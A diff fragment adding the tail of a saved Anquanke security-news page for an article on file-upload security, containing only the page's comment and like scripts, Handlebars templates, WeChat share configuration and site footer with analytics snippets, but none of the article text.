+        var currentLoginUser = getLocalUserInfo();
+        var html = reply_box_template({
+            comment_id: comment_id,
+            nickname: nickname,
+            currentLoginUser: currentLoginUser
+        });
+        $(".reply-box").empty();
+        $("#reply-box-" + comment_id).append(html);
+        getRandomNickname(comment_id);
+    }
+
+    function comment(comment_id) {
+        if (post_id) {
+            var data = {};
+            if (comment_id)
+                data.content = $("#comment-content-" + comment_id).val();
+            else
+                data.content = $("#comment-content").val();
+            data.post_id = post_id;
+            if (comment_id)
+                data.parent = comment_id;
+            if (comment_id)
+                data.nickname = $("#comment-nickname-" + comment_id).val();
+            else
+                data.nickname = $("#comment-nickname").val();
+            if (getLocalUserInfo().isLogin)
+                data.nonce = getLocalUserInfo().user.nonce;
+            axios.post(api("comment"), data)
+                .then(function (response) {
+                    if (response.data.success) {
+                        $("#comment-empty").hide();
+                        $(".reply-box").empty();
+                        appendComment(comment_id, response.data.comment);
+                        if (!comment_id)
+                            $("#comment-content").val("");
+                    } else {
+                    }
+                })
+                .catch(function (error) {
+                });
+        }
+    }
+
+    function appendComment(comment_id, comment) {
+        var comment_template_source = $("#normal-comment").html();
+        var comment_template = Handlebars.compile(comment_template_source);
+        var html = comment_template(comment);
+        if (comment_id) {
+            $("#comment-child-" + comment_id).prepend(html);
+            $("#comment-child-" + comment_id).css("display", "block");
+        } else {
+            $("#comment-list").prepend(html);
+        }
+    }
+
+    function likePost() {
+        axios.post(api("post/like"), {"id": post_id}).then(function (res) {
+
+        });
+        $("#like_status").text("已赞");
+        $(".btn-like").attr("disabled", "disabled");
+        $("#like_count_area").text("(" + (parseInt($("#like_count").text().length == 0 ? 0 : ($("#like_count").text())) + 1) + ")");
+    }
+
+    function like(comment_id) {
+        if (!$("#comment-like-button-" + comment_id).hasClass("liked")) {
+            $("#comment-like-button-" + comment_id).addClass("liked");
+            var count = $("#comment-like-count-" + comment_id).text();
+            $("#comment-like-count-" + comment_id).text((count.length == 0 ? 0 : parseInt(count)) + 1);
+            axios.post(api("comment/like"), {
+                comment_id: comment_id,
+                post_id: post_id
+            })
+                .then(function (response) {
+                    if (response.data.success) {
+                    } else {
+                    }
+                })
+                .catch(function (error) {
+                });
+        }
+    }
+
+    function getRandomNickname(comment_id) {
+        let nicknames = ['Helen', 'Anonymous', '教主', '妇科圣手', '男科圣手', '大表姐', '大表哥', '带头大哥', '白帽子', '黑帽子', '越南邻国宰相',
+            '我不是黑客', '你全家都是黑客', '匿名用户', '管理员', '吃瓜群众', '小虎', '熊猫烧香作者', 'Ping溢出大神', 'Dir溢出大神', '神奇小子',
+            '土司观光团', '网瘾患者', '杨教授'
+        ];
+        var nickname = nicknames[random(0, nicknames.length - 1)];
+        if (comment_id)
+            $("#comment-nickname-" + comment_id).val(nickname);
+        else
+            $("#comment-nickname").val(nickname);
+        return nickname;
+    }
+
+    isFollow(131779);
+
+</script>
+
+    <script type="text/template" id="reply-box">
+        <div class="comment-box">
+            <textarea placeholder="回复 @{{nickname}} 的评论" id="comment-content-{{comment_id}}"></textarea>
+            <div class="bottom-area">
+                {{#if currentLoginUser.isLogin}}
+                <div style="float:left;" class="hide-in-mobile-device">
+                    <div style="float:left;height:28px;line-height:28px;margin-top: 2px;margin-left: 6px;">
+                        <a rel="noopener noreferrer" target="_blank"
+                           href="/member/{{currentLoginUser.user.id}}"
+                           style="color:#333333">
+                            <div>
+                                <div class="avatar"
+                                     style="height:28px;width:28px;float:left;background-image:url({{currentLoginUser.user.avatar}});"></div>
+                                <div style="float:left;margin-left:5px;">
+                                    <nobr><span class="nickname">{{currentLoginUser.user.nickname}}</span></nobr>
+                                </div>
+                            </div>
+                        </a>
+                    </div>
+                </div>
+                {{else}}
+                <div style="float:left;" class="hide-in-mobile-device">
+                    <span style="color:#666666;margin-right:4px;font-size:12px;">昵称</span>
+                    <input type="text"
+                           style="border:none;height:30px;background-color:#e9e9e9;font-size:12px;padding-left:8px;color:#666666"
+                           id="comment-nickname-{{comment_id}}" style="" value="教主"></input>
+                    <span style="margin-left:12px;color:#999999;font-size:12px;cursor:pointer"
+                          onclick="getRandomNickname({{comment_id}});">
+                        <i class="fa fa-refresh" aria-hidden="true" style="margin-right:4px;"></i> 换一个</span>
+                </div>
+                {{/if}}
+                <div style="float:right;">
+                    <button class="btn btn-secondary btn-sm" onclick="$('#reply-box-{{comment_id}}').empty();">取消
+                    </button>
+                    <button class="btn btn-primary btn-sm" onclick="comment({{comment_id}});">发表评论</button>
+                </div>
+            </div>
+        </div>
+    </script>
+    <script type="text/template" id="normal-comment">
+        <li id="comment-item-{{id}}" class="comment-item {{#if parent}}subcomment{{/if}}">
+            {{#if user}}
+            <a href="/member/{{user.id}}" target="_blank">
+            <span class="img"
+                  style="background: rgba(0, 0, 0, 0) url({{crop_img user.avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span>
+            </a> {{else}}
+            <span class="img"
+                  style="background: rgba(0, 0, 0, 0) url({{crop_img avatar 120 120}}) no-repeat scroll 50% 50% / cover;"></span> {{/if}}
+            <div class="comment-item-body">
+                <div class="user-info">
+                    {{#if user}}
+                    <a href="/member/{{user.id}}" target="_blank">
+                        <span class="name {{#if_eq user.user_label 'official'}}official{{/if_eq}} {{#if_eq user.user_label 'verify'}}verify{{/if_eq}} {{#if_eq user.user_label 'src'}}src{{/if_eq}}">{{user.nickname}}</span>
+                        {{#if_eq user.user_label 'official'}}
+                        <img style="width:15px;height:15px;"
+                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t0122a13a311ae4f7aa.png"/>
+                        {{/if_eq}} {{#if_eq user.user_label 'verify'}}
+                        <img style="width:15px;height:15px;"
+                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t01d1216d1bce6e01cc.png"/>
+                        {{/if_eq}} {{#if_eq user.user_label 'src'}}
+                        <img style="width:15px;height:15px;"
+                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t014a6321f3bec70c9f.png"/>
+                        {{/if_eq}} {{#if_eq user.user_label 'company'}}
+                        <img style="width:15px;height:15px;"
+                             src="https://p0.ssl.qhimg.com/sdm/45_45_100/t015467210beb9efcab.png"/>
+                        {{/if_eq}}
+                    </a> {{else}}
+                    <span class="name" style="color:#999999">{{nickname}}</span> {{/if}} {{#if_author user.id}}
+                    <span class="time" style="color:#CC0033;font-weight:bold;vertical-align: middle">
+                        &nbsp;·&nbsp; 本文作者
+                    </span> {{/if_author}}
+                    <span class="time" style="vertical-align: middle">
+                        &nbsp;·&nbsp; {{date}}
+                    </span>
+                    <div class="user-info-right">
+                        <span class="commentlist-like">
+                            <span id="comment-like-button-{{id}}" onclick="like({{id}});"
+                                  class="commentlist-like-count {{#if liked}}liked{{/if}}">
+                                <i class="fa fa-thumbs-o-up" aria-hidden="true"></i>
+                                <span id="comment-like-count-{{id}}">{{#if_not_eq like_count 0}}{{like_count}} {{/if_not_eq}}</span>
+                        </span>
+                        </span>
+                        <a class="submit reply-comment"
+                           onclick="replyBox({{id}},'{{#if user}}{{user.nickname}}{{else}}{{nickname}}{{/if}}');">回复</a>
+                    </div>
+                </div>
+                <p>
+                    <span class="text">{{content}}</span>
+                <div class="reply-box" id="reply-box-{{id}}"></div>
+                </p>
+            </div>
+            {{#if_eq parent undefine}}
+            <ul id="comment-child-{{id}}" class="comment-child"
+                style="{{#if comments}}display:block;{{else}}display:none; {{/if}}">
+                {{subcomments comments}}
+            </ul>
+            {{/if_eq}}
+        </li>
+        {{#if comments}} {{#if parent}}
+        <ul id="comment-child-{{id}}" style="padding:0px;">
+            {{subcomments comments}}
+        </ul>
+        {{/if}} {{/if}}
+    </script>
+
+<script>
+    wx.config({
+        debug: false,
+        appId: 'wx9ba4ea8f6c451937',
+        timestamp: '1590413880',
+        nonceStr: '3CSakgDFIjYQ1eHa',
+        signature: 'ed72054f1c708f8d1b21c340d6af4ae84ce02b42',
+        jsApiList: ["onMenuShareTimeline", "onMenuShareAppMessage"]
+    });
+    wx.ready(function () {
+        wx.onMenuShareTimeline({
+            title: '对文件上传的一些思考和总结', // 分享标题
+            link: window.location.href,
+            imgUrl: 'https://p4.ssl.qhimg.com/sdm/100_100_100/t01117e245609d26661.png',
+            success: function () {
+
+            },
+            cancel: function () {
+                // 用户取消分享后执行的回调函数
+            }
+        });
+        var desc = "https://p4.ssl.qhimg.com/t01117e245609d26661.png";
+        wx.onMenuShareAppMessage({
+            title: '对文件上传的一些思考和总结',
+            desc: desc.replace(/[&\|\\\*^%$#@\-]/g, ""),
+            link: window.location.href,
+            imgUrl: 'https://p4.ssl.qhimg.com/sdm/100_100_100/t01117e245609d26661.png',
+            type: 'link',
+            dataUrl: '',
+            success: function () {
+
+            },
+            cancel: function () {
+
+            }
+        });
+    });
+
+    hs.graphicsDir = 'https://static.anquanke.com/highslide/';
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    $('.article-content img').wrap(function () {
+        if (!$(this).parent().attr('href')) {
+            var imgurl = $(this).attr('data-original');
+            return '<a href="' + imgurl + '" class="highslide-img" onclick="return hs.expand(this);" target="_blank"></a>';
+        }
+    })
+
+</script>
+<footer>
+    <div class="footer">
+        <div class="container">
+            <div class="hide-in-mobile-device">
+                <div class="row">
+                    <div class="item col col-6">
+                        <div class="logo">
+                            <img alt="安全客Logo" class="pic" src="https://p0.ssl.qhimg.com/t0168809c9f19b4fec6.png"
+                                 style="height:54px;">
+                        </div>
+                        <div style="margin-top: 20px;">
+                            <div class="row">
+                                <div class="col col-5">
+                                    <a href="https://zhuanlan.zhihu.com/c_118578260" target="_blank"
+                                       rel="noopener noreferrer">
+                                        <div class="social zhihu">
+                                            <img src="https://p0.ssl.qhimg.com/t014afa383e7a786b4a.png" alt="安全客"
+                                                 style="width: 20px; height: 20px;">
+                                        </div>
+                                    </a>
+                                </div>
+
+                                <div class="col col-5">
+                                    <a href="https://weibo.com/360adlab" target="_blank"
+                                       rel="nofollow noopener noreferrer" style="color: white">
+                                        <div class="social weibo">
+                                            <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em"
+                                                 width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
+                                                <g>
+                                                    <path d="m15.1 28.7q0.4-0.8 0.2-1.6t-1-1.1q-0.8-0.3-1.6 0t-1.4 1q-0.5 0.8-0.3 1.5t1 1.2 1.7 0 1.4-1z m2.1-2.7q0.1-0.3 0-0.6t-0.3-0.4q-0.4-0.2-0.7 0t-0.5 0.4q-0.3 0.7 0.3 1 0.3 0.1 0.7 0t0.5-0.4z m3.8 2.3q-1 2.3-3.5 3.4t-5 0.3q-2.4-0.8-3.3-2.9t0.2-4.1q1-2.1 3.4-3.1t4.7-0.5q2.4 0.7 3.5 2.7t0 4.2z m7-3.5q-0.2-2.2-2-3.8t-4.6-2.5-6.2-0.4q-4.9 0.5-8.2 3.1t-3 5.9q0.2 2.2 2 3.8t4.7 2.5 6.1 0.4q5-0.5 8.3-3.1t2.9-5.9z m6.9 0.1q0 1.5-0.8 3.1t-2.5 3-3.7 2.7-5.1 1.8-6 0.7-6.2-0.7-5.3-2.1-3.9-3.4-1.4-4.4q0-2.6 1.6-5.5t4.4-5.8q3.7-3.7 7.6-5.2t5.5 0.1q1.4 1.4 0.4 4.7-0.1 0.3 0 0.4t0.2 0.2 0.4 0 0.3-0.1l0.1-0.1q3.1-1.3 5.5-1.3t3.4 1.4q1 1.4 0 4 0 0.3-0.1 0.4t0.1 0.3 0.3 0.2 0.3 0.1q1.3 0.4 2.3 1t1.8 1.9 0.8 2.6z m-1.7-14q1 1.1 1.3 2.5t-0.2 2.6q-0.2 0.5-0.7 0.7t-0.9 0.1q-0.6-0.1-0.8-0.6t-0.1-1q0.5-1.4-0.5-2.5t-2.4-0.8q-0.6 0.1-1-0.2t-0.6-0.8q-0.1-0.5 0.2-1t0.8-0.5q1.4-0.3 2.7 0.1t2.2 1.4z m4.1-3.6q1.9 2.1 2.5 5t-0.3 5.4q-0.2 0.6-0.8 0.8t-1.1 0.1-0.9-0.7-0.1-1.2q0.6-1.8 0.2-3.8t-1.8-3.5q-1.4-1.6-3.3-2.2t-3.9-0.2q-0.6 0.2-1.1-0.2t-0.7-1 0.2-1.1 1-0.7q2.7-0.5 5.4 0.3t4.7 3z"></path>
+                                                </g>
+                                            </svg>
+                                        </div>
+                                    </a>
+                                </div>
+                                <!-- Modal -->
+
+                                <div class="col col-5">
+                                    <div class="social weixin" data-toggle="modal" data-target="#wechat-qrcode">
+                                        <svg fill="currentColor" preserveAspectRatio="xMidYMid meet" height="1em"
+                                             width="1em" viewBox="0 0 40 40" style="vertical-align: middle;">
+                                            <g>
+                                                <path d="m11.3 11.6q0-0.8-0.5-1.3t-1.3-0.5q-0.8 0-1.5 0.5t-0.6 1.3q0 0.7 0.6 1.2t1.5 0.5q0.8 0 1.3-0.5t0.5-1.2z m14.4 9.8q0-0.5-0.5-1t-1.3-0.4q-0.5 0-0.9 0.4t-0.5 1q0 0.5 0.5 1t0.9 0.4q0.8 0 1.3-0.4t0.5-1z m-4.6-9.8q0-0.8-0.5-1.3t-1.2-0.5q-0.9 0-1.5 0.5t-0.7 1.3q0 0.7 0.7 1.2t1.5 0.5q0.7 0 1.2-0.5t0.5-1.2z m12.3 9.8q0-0.5-0.5-1t-1.2-0.4q-0.6 0-1 0.4t-0.4 1q0 0.5 0.4 1t1 0.4q0.7 0 1.2-0.4t0.5-1z m-5.1-7.7q-0.6-0.1-1.4-0.1-3.3 0-6 1.5t-4.4 4.1-1.6 5.5q0 1.5 0.5 3-0.7 0-1.3 0-0.5 0-1 0t-1.1-0.1-0.8-0.1-1.1-0.2-1-0.3l-4.9 2.5 1.4-4.2q-5.6-4-5.6-9.5 0-3.3 1.9-6.1t5.1-4.3 7.1-1.6q3.4 0 6.4 1.3t5.1 3.5 2.7 5.1z m11.5 10.9q0 2.3-1.4 4.3t-3.6 3.8l1.1 3.5-3.9-2.1q-2.9 0.7-4.2 0.7-3.3 0-6-1.4t-4.4-3.7-1.6-5.1 1.6-5.1 4.4-3.8 6-1.3q3.1 0 5.9 1.3t4.4 3.8 1.6 5.1z"></path>
+                                            </g>
+                                        </svg>
+                                    </div>
+                                    <div class="modal fade " id="wechat-qrcode" tabindex="-1" role="dialog"
+                                         aria-hidden="true">
+                                        <div class="modal-dialog  modal-sm" role="document" style="width: 265px;">
+                                            <div class="modal-content"
+                                                 style="width: 265px !important;padding: 0px !important;">
+                                                <div class="modal-header">
+                                                    <h5 class="modal-title" id="exampleModalLabel">微信二维码</h5>
+                                                    <button type="button" class="close" data-dismiss="modal"
+                                                            aria-label="Close">
+                                                        <span aria-hidden="true">&times;</span>
+                                                    </button>
+                                                </div>
+                                                <div class="modal-body" style="padding: 0px !important;">
+                                                    <img src="https://p0.ssl.qhimg.com/t0151209205b47f2270.jpg"
+                                                         alt="安全客" style="width: 265x; height: 265px;">
+                                                </div>
+
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="item col col-5">
+                        <h2>安全客</h2>
+                        <ul>
+                            <li>
+                                <a href="/about" rel="noopener noreferrer" target="_blank">关于我们</a>
+                            </li>
+                            <li>
+                                <a href="/join" target="_blank" rel="noopener noreferrer">加入我们</a>
+                            </li>
+                            <li>
+                                <a href="/note/contact" target="_blank" rel="noopener noreferrer">联系我们</a>
+                            </li>
+                            <li>
+                                <a href="/note/protocol" target="_blank" rel="noopener noreferrer">用户协议</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="item col col-5">
+                        <h2>商务合作</h2>
+                        <ul>
+                            <li>
+                                <a href="/note/business" target="_blank" rel="noopener noreferrer">合作内容</a>
+                            </li>
+                            <li>
+                                <a href="/note/contact" target="_blank" rel="noopener noreferrer">联系方式</a>
+                            </li>
+                            <li>
+                                <a href="/link" target="_blank" rel="noopener noreferrer">友情链接</a>
+                            </li>
+                        </ul>
+                    </div>
+                    <div class="item col col-5">
+                        <h2>内容须知</h2>
+                        <ul>
+                            <li>
+                                <a href="https://www.anquanke.com/contribute/tips" target="_blank"
+                                   rel="noopener noreferrer">投稿须知</a>
+                            </li>
+                            <li>
+                                <a href="/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a>
+                            </li>
+                            <li>
+                                官网QQ群3：830462644
+                            </li>
+                            <li>
+                                官网QQ群2：814450983(已满)
+                            </li>
+                            <li>
+                                官网QQ群1：702511263(已满)
+                            </li>
+
+
+                        </ul>
+                    </div>
+                    <div class="item col col-3">
+                        <h2>合作单位</h2>
+                        <ul>
+                            <li>
+                                <a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer">
+                                    <img alt="安全客" src="https://p0.ssl.qhimg.com/t01592a959354157bc0.png"
+                                         style="max-height: 40px;">
+                                </a>
+                            </li>
+                            <li>
+                                <a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer">
+                                    <img alt="安全客" src="https://p0.ssl.qhimg.com/t014f76fcea94035e47.png"
+                                         style="max-height: 50px;margin-top:10px;">
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+            <div class="bottom-info">Copyright © 360网络攻防实验室 All Rights Reserved 京ICP备08010314号-66
+                <script type="text/javascript">var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+                    document.write(unescape("%3Cspan id='cnzz_stat_icon_1271278035'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s22.cnzz.com/z_stat.php%3Fid%3D1271278035%26show%3Dpic' type='text/javascript'%3E%3C/script%3E"));</script>
+                <script>
+                    (function () {
+                        var bp = document.createElement('script');
+                        var curProtocol = window.location.protocol.split(':')[0];
+                        if (curProtocol === 'https') {
+                            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                        }
+                        else {
+                            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                        }
+                        var s = document.getElementsByTagName("script")[0];
+                        s.parentNode.insertBefore(bp, s);
+                    })();
+                </script>
+            </div>
+        </div>
+    </div>
+
+    <div class="back-to-top" onclick='$("html,body").animate({scrollTop:0}, 500);'
+         style="position: fixed;bottom:40px;right: 20px;height: 40px;width: 40px;background-color: #1dada7;border-radius: 50%;text-align: center;cursor: pointer">
+        <img src="https://p0.ssl.qhimg.com/t0179ac3294ef926b8c.png" style="width:30px;margin-top: 6px;">
+    </div>
+    <div id="dynamicScript">
+    </div>
+
+</footer></body>
+
+</html>
